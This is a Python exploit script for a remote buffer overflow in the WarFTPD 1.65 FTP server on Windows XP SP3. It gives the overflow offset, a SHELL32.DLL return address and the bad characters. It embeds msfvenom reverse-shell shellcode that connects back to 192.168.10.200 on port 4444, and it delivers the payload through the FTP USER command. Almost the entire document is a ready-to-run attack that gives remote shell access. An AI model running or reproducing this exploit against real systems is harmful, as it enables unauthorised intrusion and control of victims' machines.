# Remote BufferOverflow: WarFTPD-1.65
# Tested on: Windows XP Professional SP3 PT-BR Version
# Created by: 0x53 - Twitter: @samueltuxx

import socket, sys

# Crash: 700
# EIP in: 485 + "BBBB"
# Return Address: 7c9d30d7 (SHELL32.DLL)

# bad: \x00\x0a\x0d\x40

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.10.200 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x40" -f python

buf =  ""
buf += "\xba\x4b\xfa\xb2\xcf\xda\xcf\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x52\x83\xc6\x04\x31\x56\x0e\x03\x1d\xf4\x50"
buf += "\x3a\x5d\xe0\x17\xc5\x9d\xf1\x77\x4f\x78\xc0\xb7\x2b"
buf += "\x09\x73\x08\x3f\x5f\x78\xe3\x6d\x4b\x0b\x81\xb9\x7c"
buf += "\xbc\x2c\x9c\xb3\x3d\x1c\xdc\xd2\xbd\x5f\x31\x34\xff"
buf += "\xaf\x44\x35\x38\xcd\xa5\x67\x91\x99\x18\x97\x96\xd4"
buf += "\xa0\x1c\xe4\xf9\xa0\xc1\xbd\xf8\x81\x54\xb5\xa2\x01"
buf += "\x57\x1a\xdf\x0b\x4f\x7f\xda\xc2\xe4\x4b\x90\xd4\x2c"
buf += "\x82\x59\x7a\x11\x2a\xa8\x82\x56\x8d\x53\xf1\xae\xed"
buf += "\xee\x02\x75\x8f\x34\x86\x6d\x37\xbe\x30\x49\xc9\x13"
buf += "\xa6\x1a\xc5\xd8\xac\x44\xca\xdf\x61\xff\xf6\x54\x84"
buf += "\x2f\x7f\x2e\xa3\xeb\xdb\xf4\xca\xaa\x81\x5b\xf2\xac"
buf += "\x69\x03\x56\xa7\x84\x50\xeb\xea\xc0\x95\xc6\x14\x11"
buf += "\xb2\x51\x67\x23\x1d\xca\xef\x0f\xd6\xd4\xe8\x70\xcd"
buf += "\xa1\x66\x8f\xee\xd1\xaf\x54\xba\x81\xc7\x7d\xc3\x49"
buf += "\x17\x81\x16\xdd\x47\x2d\xc9\x9e\x37\x8d\xb9\x76\x5d"
buf += "\x02\xe5\x67\x5e\xc8\x8e\x02\xa5\x9b\x70\x7a\xaf\x93"
buf += "\x19\x79\xaf\x32\x86\xf4\x49\x5e\x26\x51\xc2\xf7\xdf"
buf += "\xf8\x98\x66\x1f\xd7\xe5\xa9\xab\xd4\x1a\x67\x5c\x90"
buf += "\x08\x10\xac\xef\x72\xb7\xb3\xc5\x1a\x5b\x21\x82\xda"
buf += "\x12\x5a\x1d\x8d\x73\xac\x54\x5b\x6e\x97\xce\x79\x73"
buf += "\x41\x28\x39\xa8\xb2\xb7\xc0\x3d\x8e\x93\xd2\xfb\x0f"
buf += "\x98\x86\x53\x46\x76\x70\x12\x30\x38\x2a\xcc\xef\x92"
buf += "\xba\x89\xc3\x24\xbc\x95\x09\xd3\x20\x27\xe4\xa2\x5f"
buf += "\x88\x60\x23\x18\xf4\x10\xcc\xf3\xbc\x31\x2f\xd1\xc8"
buf += "\xd9\xf6\xb0\x70\x84\x08\x6f\xb6\xb1\x8a\x85\x47\x46"
buf += "\x92\xec\x42\x02\x14\x1d\x3f\x1b\xf1\x21\xec\x1c\xd0"
b = "A" * 485 + "\xd7\x30\x9d\x7c" + "\x90" * (len(buf)-211) + buf

try:
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((sys.argv[1],int(sys.argv[2])))
    r = s.recv(1024)
    print("[*] Sending bytes to Host.")
    s.send("USER "+b+"\r\n")
    print("[SUCCESS] - WarFTPD EXPLOITED :)")
except socket.error:
    print("[ERROR] Unable to connect to host :(")
    sys.exit(0)
except IndexError:
    print("Use: "+sys.argv[0]+" host port")
